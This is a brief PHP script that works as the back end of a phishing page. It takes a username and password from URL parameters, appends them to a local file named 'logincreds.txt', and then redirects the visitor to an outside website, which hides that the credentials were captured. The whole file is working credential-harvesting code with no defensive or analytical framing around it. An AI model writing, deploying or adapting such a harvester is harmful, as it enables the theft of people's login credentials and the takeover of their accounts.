<?php
// Specify the file where the credentials will be saved
$filename = 'logincreds.txt';

// Get the username and password from the GET parameters
$username = isset($_GET['uname']) ? $_GET['uname'] : '';
$password = isset($_GET['pwd']) ? $_GET['pwd'] : '';

// Sanitize the input to prevent injection attacks
$username = htmlspecialchars($username, ENT_QUOTES, 'UTF-8');
$password = htmlspecialchars($password, ENT_QUOTES, 'UTF-8');

// Format the data to be saved
$data = "$username\n$password\n\n";

// Save the data to the file
file_put_contents($filename, $data, FILE_APPEND);

// Optional: Provide feedback that the data has been saved
header('Location: https://penetrentix.com');
?>
